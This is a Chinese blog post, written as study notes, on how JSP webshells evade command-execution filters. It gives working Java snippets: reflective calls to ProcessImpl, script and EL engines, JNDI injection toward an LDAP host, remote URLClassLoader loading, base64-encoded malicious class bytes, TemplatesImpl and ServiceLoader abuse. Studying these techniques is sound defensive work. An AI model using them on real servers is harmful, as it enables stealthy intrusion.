---
layout:     post
title:      "JSP绕过方式学习"
subtitle:   ""
date:       2021-04-15 13:14:20
author:     "kuron3k0"
header-img: "img/post-bg-rwd.jpg"
tags:
    - Java
---



来学一下`threedr3am`大佬的[jsp-webshell](https://github.com/threedr3am/JSP-Webshells)中用到的绕过技术（其中涉及到的类都是jdk中自带的）



## 0x00 命令执行、反射

最简单的执行命令有这么几种

### ProcessBuilder

```java
new ProcessBuilder("calc").start();
```



### Runtime.exec

```java
Runtime.getRuntime().exec("calc");
```



但是要注意的是`Runtime.exec`和`ProcessBuilder`传参为字符串的时候，都不能执行多条命令

`ProcessBuilder`会直接报错

```po
Exception in thread "main" java.io.IOException: Cannot run program "calc && notepad": CreateProcess error=2, 系统找不到指定的文件。
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)
	at Evil16.main(Evil16.java:39)
Caused by: java.io.IOException: CreateProcess error=2, 系统找不到指定的文件。
	at java.lang.ProcessImpl.create(Native Method)
	at java.lang.ProcessImpl.<init>(ProcessImpl.java:386)
	at java.lang.ProcessImpl.start(ProcessImpl.java:137)
	at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
```

`Runtime.exec`只会执行第一条

![](/img/in-post/learn-jsp-webshell/1.png)

除非是`cmd /c xxx`或者`sh -c xxxx`的形式



### ProcessImpl

但是有时候这两个最常见的执行命令的方法会被过滤，这时可以考虑直接调用他们底层最终都会调用的`ProcessImpl`，因为不是一个public的类，所以可以通过反射的形式直接调用`ProcessImpl`的`start`方法

```java
Class clz = Class.forName("java.lang.ProcessImpl");
Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
method.setAccessible(true);
method.invoke(clz,"calc".split(" "), null, null, null, false);
```

同样的，如果`method.invoke`被禁用，可以调用`MethodUtil`，其实里面还是`method.invoke`
```java
Class clz = Class.forName("java.lang.ProcessImpl");
Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
method.setAccessible(true);
MethodUtil.invoke(method,clz,new Object[]{"calc".split(" "), null, null, null, false});
//  method.invoke(clz,"calc".split(" "), null, null, null, false);
```




### MethodAccessor

也可以直接调用底层的**MethodAccessor**

```java
Class clz = Class.forName("java.lang.ProcessImpl");
Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
method.setAccessible(true);
// method.invoke(clz,"calc".split(" "), null, null, null, false);
ReflectionFactory reflectionFactory = AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());
MethodAccessor methodAccessor = reflectionFactory.newMethodAccessor(method);
methodAccessor.invoke(clz,new Object[]{"calc".split(" "), null, null, null, false});
```



后面的都是基于上面的命令执行方法做的嵌套变形了



## 0x02 表达式、脚本引擎

### ScriptEngine

java内置的js解析引擎，可以运行java代码

```java
new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("java.lang.Runtime.getRuntime().exec(\"calc\");"
```



### ELExpression

EL表达式，在JNDI绕过高版本jdk限制的利用方法里比较经典的就是用这个了

```java
String expression = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder('calc').start()\")";
ELManager manager = new ELManager();
ELContext context = manager.getELContext();
ExpressionFactory factory = ELManager.getExpressionFactory();
ValueExpression ve = factory.createValueExpression(context, "${" + expression + "}", Object.class);
ve.getValue(context);
```

```java
ELProcessor processor = new ELProcessor();
Process process = (Process) processor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder('calc').start()\")");
```



## 0x03 JNDI注入

### JdbcRowSetImpl

fastjson用的比较多的payload，jndi注入，需要准备恶意类和起一个ldap服务器

```java
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
jdbcRowSet.setDataSourceName("ldap://1.1.1.1/#exp");
try {
	jdbcRowSet.setAutoCommit(true);
} catch (Throwable e) {
        
}
```



## 0x04 类加载器和类字节码

### VersionHelper

在jndi注入的时候，`NamingManager`中`getObjectFactoryFromReference`就调用了**VersionHelper**，因为`loadClass`第二个参数用了codebase，所以前面需要把`trustURLCodebase`打开，然后恶意类放在d盘下即可

```java
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
VersionHelper.getVersionHelper().loadClass("Test","file:///D:/").getConstructor().newInstance();
```



### URLClassLoader

先把恶意类打包成jar

```shell
jar -cvf bcel.jar BCEL.class
```
然后就可以用`URLClassLoader`远程加载了
```java
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://127.0.0.1:8888/bcel.jar")}).loadClass("BCEL").getConstructor().newInstance();
```



### 自定义ClassLoader

直接继承ClassLoader后重载loadClass，当要加载的类名是恶意类时，调用defineClass进行加载

```java
public class UDClassLoader extends java.lang.ClassLoader {

    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        if (name.contains("BCEL")) {
            try {
                byte[] bytes = java.util.Base64.getDecoder().decode("yv66vgAAADQAbAoAGgA0BwA1BwA2CAA3CgADADgKAAIAOQoAOgA7CgA6ADwKAD0APgkAPwBACgBBAEIHAEMKAAwANAcARAoADgA0CABFCgAOAEYKAA4ARwoADABICgBJAEoIAEsKAEkATAcATQoAFwBOBwBPBwBQAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMQkNFTDsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAVieXRlcwEAAltCAQAEY29kZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACkV4Y2VwdGlvbnMBAAg8Y2xpbml0PgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcATQEAClNvdXJjZUZpbGUBAAlCQ0VMLmphdmEMABsAHAEAF2phdmEvaW8vRmlsZUlucHV0U3RyZWFtAQAMamF2YS9pby9GaWxlAQAxRDpc5riX6YCPXEpTUC1XZWJzaGVsbHNcdGFyZ2V0XGNsYXNzZXNcQkNFTC5jbGFzcwwAGwBRDAAbAFIHAFMMAFQAVQwAVgBXBwBYDABZAFoHAFsMAFwAXQcAXgwAXwBRAQAxY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvdXRpbC9DbGFzc0xvYWRlcgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAIJCRCQ0VMJCQMAGAAYQwAYgBjDABkAGUHAGYMAGcAaAEABGNhbGMMAGkAagEAE2phdmEvbGFuZy9FeGNlcHRpb24MAGsAHAEABEJDRUwBABBqYXZhL2xhbmcvT2JqZWN0AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARKExqYXZhL2lvL0ZpbGU7KVYBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAyY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvY2xhc3NmaWxlL1V0aWxpdHkBAAZlbmNvZGUBABcoW0JaKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhABkAGgAAAAAAAwABABsAHAABAB0AAAAvAAEAAQAAAAUqtwABsQAAAAIAHgAAAAYAAQAAAAUAHwAAAAwAAQAAAAUAIAAhAAAACQAiACMAAgAdAAAAqgAFAAQAAABKuwACWbsAA1kSBLcABbcABkwrtgAHvAhNKyy2AAhXLAS4AAlOsgAKLbYAC7sADFm3AA27AA5ZtwAPEhC2ABEttgARtgAStgATV7EAAAACAB4AAAAeAAcAAAARABEAEgAYABMAHgAUACQAFQArABYASQAXAB8AAAAqAAQAAABKACQAJQAAABEAOQAmACcAAQAYADIAKAApAAIAJAAmACoAKwADACwAAAAEAAEAFwAIAC0AHAABAB0AAABhAAIAAQAAABK4ABQSFbYAFlenAAhLKrYAGLEAAQAAAAkADAAXAAMAHgAAABYABQAAAAkACQAMAAwACgANAAsAEQANAB8AAAAMAAEADQAEAC4ALwAAADAAAAAHAAJMBwAxBAABADIAAAACADM=");
                PermissionCollection pc = new Permissions();
                pc.add(new AllPermission());
                ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (java.security.cert.Certificate[]) null), pc, this, null);
                return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return super.loadClass(name);
    }

    public static void main(String[] args) throws Exception {
        new UDClassLoader().loadClass("BCEL").getConstructor().newInstance();
     
    }
}
```



### ScriptLoader

ScriptLoader类加载器，非public类需要反射调用，installClass实际上就是defineClass，

```java
synchronized Class<?> installClass(String name, byte[] data, CodeSource cs) {
        return this.defineClass(name, data, 0, data.length, (CodeSource)Objects.requireNonNull(cs));
}
```

```java
Class cls =  Class.forName("jdk.nashorn.internal.runtime.ScriptLoader");
Constructor con = cls.getDeclaredConstructor(Context.class);
con.setAccessible(true);
Object s = con.newInstance(new Context(new Options(""),null,null));
Method m = cls.getDeclaredMethod("installClass", String.class, byte[].class, CodeSource.class);
m.setAccessible(true);
byte[] b=Base64.getDecoder().decode("yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHABkMABoAGwEABGNhbGMMABwAHQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAARUZXN0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAcAAAAAAAIAAQAIAAkAAQAKAAAAHQABAAEAAAAFKrcAAbEAAAABAAsAAAAGAAEAAAACAAgADAAJAAEACgAAAEcAAgABAAAADrgAAhIDtgAEV6cABEuxAAEAAAAJAAwABQACAAsAAAASAAQAAAAGAAkACQAMAAcADQAKAA0AAAAHAAJMBwAOAAABAA8AAAACABA=");
m.invoke(s,"Test",b,new CodeSource(null, (java.security.cert.Certificate[]) null));
Class.forName("Test");
```



### BCEL

一种类字节码的编码方式，类似hex编码，每一个字节前都有一个`$`标识符

因为我在本地测试，所以要注释掉static块排除影响，因为loadClass不会加载static块

```java
public class BCEL {
/*
    static{
        try {
            Runtime.getRuntime().exec("calc");
        }catch(Exception ex){
            ex.printStackTrace();
        }
    }

*/
    public static void main(String[] args) throws Exception {
        InputStream inputStream = new FileInputStream(new File("D:\\BCEL.class"));
        byte[] bytes = new byte[inputStream.available()];
        inputStream.read(bytes);
        String code = Utility.encode(bytes, true);
        System.out.println(code);
        new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass("$$BCEL$$" + code).getConstructor().newInstance();
    }
}
```

刚开始调试发现`com.sun.org.apache.bcel.internal.util`包下没有`ClassLoader`这个类，后面查资料发现在`Java 8u251`之后`ClassLoader`就被删除了，如果要用到的话注意jdk的版本，参考[p神的文章](https://cloud.tencent.com/developer/article/1730722)



### TemplatesImpl

也是经典payload了，因为最后是调用get方法触发类初始化，所以可以比较方便的用在fastjson中

主要攻击的类字节码赋值给`_bytecodes`，注意是二维数组

```java
TemplatesImpl t = new TemplatesImpl();
byte[][] bytes = new byte[1][];
bytes[0] = Base64.getDecoder().decode("yv66vgAAADQALwoABwAhCgAiACMIACQKACIAJQcAJgcAJwcAKAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTFRlc3Q7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACkBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAJgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcAKgwAKwAsAQAEY2FsYwwALQAuAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAABAABAAgACQABAAoAAAAvAAEAAQAAAAUqtwABsQAAAAIACwAAAAYAAQAAAAcADAAAAAwAAQAAAAUADQAOAAAAAQAPABAAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABQADAAAACAAAwAAAAEADQAOAAAAAAABABEAEgABAAAAAQATABQAAgAVAAAABAABABYAAQAPABcAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABoADAAAACoABAAAAAEADQAOAAAAAAABABEAEgABAAAAAQAYABkAAgAAAAEAGgAbAAMAFQAAAAQAAQAWAAgAHAAJAAEACgAAAE8AAgABAAAADrgAAhIDtgAEV6cABEuxAAEAAAAJAAwABQADAAsAAAASAAQAAAALAAkADgAMAAwADQAPAAwAAAACAAAAHQAAAAcAAkwHAB4AAAEAHwAAAAIAIA==");
field.setAccessible(true);
Field f=TemplatesImpl.class.getDeclaredField("_bytecodes");
f.setAccessible(true);
f.set(t,bytes);

f=TemplatesImpl.class.getDeclaredField("_tfactory");
f.setAccessible(true);
f.set(t,TransformerFactoryImpl.newInstance());

f=TemplatesImpl.class.getDeclaredField("_name");
f.setAccessible(true);
f.set(t,"whatever");

t.getOutputProperties();
```

`TemplatesImpl->getTransletInstance`，`_name`不能为空

```java
if (_name == null) return null;
```

且类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，不然走不下去

```java
 for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }

            if (_transletIndex < 0) {
                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            }
......
```



## 0x05 动态编译

### JavaCompiler

java支持用javaCompiler进行运行时动态编译，编译完生成class文件，用URLClassLoader加载即可

```java
JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();
DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector<JavaFileObject>();
StandardJavaFileManager fileManager = javaCompiler.getStandardFileManager(null,null,null);
List<File> sourceFileList = new ArrayList<File>();
sourceFileList.add(new File("D:\\Test.java"));
Iterable compilationUnits = fileManager.getJavaFileObjectsFromFiles(sourceFileList);
if(javaCompiler.getTask(null, fileManager, diagnostics, null, null, compilationUnits).call())
	new URLClassLoader(new URL[]{new URL("file:///D:/" )}).loadClass("Test" ).newInstance();
```



## 0x06 SPI机制

Java SPI机制实现了解耦，使得第三方服务模块的装配控制的逻辑与调用者的业务代码分离，而不是耦合在一起。应用程序可以根据实际业务情况启用框架扩展或替换框架组件

### ServiceLoader

调用代码

```java
ServiceLoader<ScriptEngineFactory> iterator = ServiceLoader.load(ScriptEngineFactory.class);
for(ScriptEngineFactory i:iterator){
	i.getEngineName();
}
```

需要新建这一个文件`META-INF/services/javax.script.ScriptEngineFactory`，然后内容是继承`ScriptEngineFactory`的`EvilScript`

```java
EvilScript
```

`EvilScript`实现中重载了`getEngineName`方法，`ServiceLoader`直接调用这个方法即可触发命令执行

```java
public class EvilScript implements ScriptEngineFactory {

  public EvilScript() throws Throwable {
    
  }

  @Override
  public String getEngineName() {
    try {
      Runtime.getRuntime().exec("calc");
    }catch(Exception e){
      e.printStackTrace();
    }
    return null;
  }

```

如果要在实战中使用需要上传一个jar包，然后`ServiceLoader`第二个参数的`URLClassLoader`加载这个jar包







## 参考

[https://github.com/threedr3am/JSP-Webshells](https://github.com/threedr3am/JSP-Webshells)

[https://www.jianshu.com/p/46b42f7f593c](https://www.jianshu.com/p/46b42f7f593c)

[https://cloud.tencent.com/developer/article/1730722](https://cloud.tencent.com/developer/article/1730722)